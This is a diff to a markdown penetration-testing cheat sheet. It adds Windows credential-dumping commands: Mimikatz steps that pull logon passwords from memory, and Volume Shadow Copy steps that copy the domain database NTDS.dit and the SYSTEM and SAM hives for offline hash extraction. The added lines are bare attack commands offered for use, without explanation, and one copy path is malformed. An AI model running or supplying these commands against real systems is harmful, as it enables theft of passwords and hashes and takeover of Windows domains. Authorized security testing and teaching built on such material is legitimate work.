@@ -12,7 +12,24 @@ Run fgdump to dump local hash
 
 > `meterpreter > hashdump`
 
+#### Mimikatz
+> `PS C:\temp\mimikatz> .\mimikatz`
+
+>  `mimikatz # privilege::debug`
+
+>  `mimikatz # sekurlsa::logonpasswords`
+
+
 #### Volume Shadow Copy Services to copy ntds.dit
+
+
+> `cscript vssown.vbs /start`
+
+> `cscript vssown.vbs /create`
+
+> `copy \\?GLOBALROOT\Device\HarddiskVolumeShadowCopy\[X\]\Windows\NTDS\NTDS.dit c:\`
+> `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy\[X\]\Windows\System32\config\SYSTEM c:\`
+> `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy\[X\]\Windows\System32\SAM c:\`
 
 ### Hash identification
 
